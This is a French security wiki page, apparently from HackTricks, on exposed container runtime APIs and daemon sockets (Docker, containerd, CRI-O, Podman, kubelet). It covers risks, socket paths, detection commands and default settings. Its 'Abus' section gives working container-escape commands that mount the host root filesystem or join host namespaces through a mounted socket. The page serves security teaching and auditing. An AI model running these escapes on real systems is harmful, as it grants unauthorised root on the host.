# API runtime et exposition du daemon

{{#include ../../../banners/hacktricks-training.md}}

## Vue d'ensemble

De nombreuses compromissions réelles de conteneurs ne commencent pas du tout par une évasion de namespace. Elles commencent par un accès au plan de contrôle du runtime. Si une charge de travail peut communiquer avec `dockerd`, `containerd`, CRI-O, Podman ou kubelet via un socket Unix monté ou un écouteur TCP exposé, l'attaquant peut être capable de demander un nouveau conteneur avec des privilèges accrus, monter le système de fichiers de l'hôte, rejoindre les namespaces de l'hôte ou récupérer des informations sensibles du nœud. Dans ces cas, l'API runtime est la véritable frontière de sécurité, et la compromettre revient fonctionnellement à compromettre l'hôte.

C'est pourquoi l'exposition du socket runtime doit être documentée séparément des protections du noyau. Un conteneur avec des seccomp, capabilities et MAC confinement ordinaires peut néanmoins être à un appel d'API d'une compromission de l'hôte si `/var/run/docker.sock` ou `/run/containerd/containerd.sock` y est monté. L'isolation du noyau du conteneur en cours peut fonctionner exactement comme prévu tandis que le plan de gestion runtime reste totalement exposé.

## Modèles d'accès au daemon

Docker Engine expose traditionnellement son API privilégiée via le socket Unix local `unix:///var/run/docker.sock`. Historiquement, il a aussi été exposé à distance via des écouteurs TCP tels que `tcp://0.0.0.0:2375` ou via un écouteur protégé par TLS sur le port `2376`. Exposer le daemon à distance sans TLS robuste et authentification client transforme effectivement la Docker API en une interface root distante.

containerd, CRI-O, Podman et kubelet exposent des surfaces d'impact similaires. Les noms et workflows diffèrent, mais la logique ne change pas. Si l'interface permet à l'appelant de créer des charges de travail, monter des chemins de l'hôte, récupérer des credentials ou modifier des conteneurs en cours d'exécution, l'interface est un canal de gestion privilégié et doit être traitée comme tel.

Chemins locaux courants à vérifier sont :
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Les stacks plus anciens ou plus spécialisés peuvent également exposer des endpoints tels que `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Ceux-ci sont moins courants dans les environnements modernes, mais lorsqu'ils sont rencontrés, ils doivent être traités avec la même prudence car ils représentent des surfaces de contrôle d'exécution plutôt que de simples sockets d'application.

## Accès distant sécurisé

Si un daemon doit être exposé au-delà du socket local, la connexion doit être protégée par TLS et de préférence par authentification mutuelle afin que le daemon vérifie le client et que le client vérifie le daemon. La vieille habitude d'ouvrir le Docker daemon en plain HTTP par commodité est l'une des erreurs les plus dangereuses en administration de conteneurs, car la surface de l'API est suffisamment puissante pour créer directement des conteneurs privilégiés.

Le modèle historique de configuration de Docker ressemblait à :
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Sur des hôtes basés sur systemd, la communication du daemon peut aussi apparaître sous `fd://`, ce qui signifie que le processus hérite d'un socket pré-ouvert par systemd plutôt que de le binder directement lui-même. L'important n'est pas la syntaxe exacte mais la conséquence pour la sécurité. Dès que le daemon écoute au-delà d'un socket local strictement permissionné, la sécurité du transport et l'authentification des clients deviennent obligatoires plutôt que des mesures de hardening optionnelles.

## Abus

Si un runtime socket est présent, vérifiez lequel il s'agit, s'il existe un client compatible, et si un accès HTTP brut ou gRPC est possible :
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Ces commandes sont utiles car elles permettent de distinguer entre un chemin mort, un socket monté mais inaccessible, et une API privilégiée active. Si le client réussit, la question suivante est de savoir si l'API peut lancer un nouveau conteneur avec un host bind mount or host namespace sharing.

### Exemple complet : Docker Socket To Host Root

Si `docker.sock` est accessible, l'évasion classique consiste à démarrer un nouveau conteneur qui monte le système de fichiers racine de l'hôte puis à faire un `chroot` dedans :
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Cela permet une exécution en root sur l'hôte via le daemon Docker. L'impact ne se limite pas à la lecture de fichiers. Une fois à l'intérieur du nouveau conteneur, l'attaquant peut modifier les fichiers de l'hôte, exfiltrer des identifiants, implanter une persistance, ou lancer d'autres privileged workloads.

### Exemple complet : Docker Socket To Host Namespaces

Si l'attaquant préfère namespace entry au lieu d'un accès filesystem-only :
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ce chemin atteint l'hôte en demandant au runtime de créer un nouveau conteneur avec une exposition explicite du namespace de l'hôte plutôt qu'en exploitant celui en cours.

### Exemple complet : socket containerd

Un socket `containerd` monté est généralement tout aussi dangereux :
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
L'impact est, à nouveau, la compromission de l'hôte. Même si les outils spécifiques à Docker sont absents, une autre runtime API peut néanmoins offrir le même pouvoir administratif.

## Vérifications

L'objectif de ces vérifications est de répondre à la question de savoir si le container peut atteindre un management plane qui aurait dû rester en dehors du périmètre de confiance.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Ce qui est intéressant ici :

- Un socket runtime monté est généralement une primitive administrative directe plutôt qu'une simple divulgation d'informations.
- Un écouteur TCP sur `2375` sans TLS doit être traité comme une condition de compromission à distance.
- Les variables d'environnement telles que `DOCKER_HOST` révèlent souvent que la charge de travail a été conçue intentionnellement pour communiquer avec le runtime de l'hôte.

## Paramètres par défaut du runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix local par défaut | `dockerd` écoute sur le socket local et le daemon est généralement exécuté avec des privilèges root | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | CLI sans daemon par défaut | Aucun daemon privilégié de longue durée n'est requis pour un usage local ordinaire ; les sockets API peuvent toutefois être exposés lorsque `podman system service` est activé | exposing `podman.sock`, running the service broadly, utilisation de l'API avec privilèges root |
| containerd | Socket local privilégié | API administrative exposée via le socket local et généralement consommée par des outils de plus haut niveau | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Socket local privilégié | Le endpoint CRI est destiné aux composants de confiance locaux au nœud | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | API de gestion locale au nœud | Kubelet ne devrait pas être largement accessible depuis les Pods ; l'accès peut exposer l'état des pods, des identifiants et des fonctionnalités d'exécution selon l'authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
{{#include ../../../banners/hacktricks-training.md}}
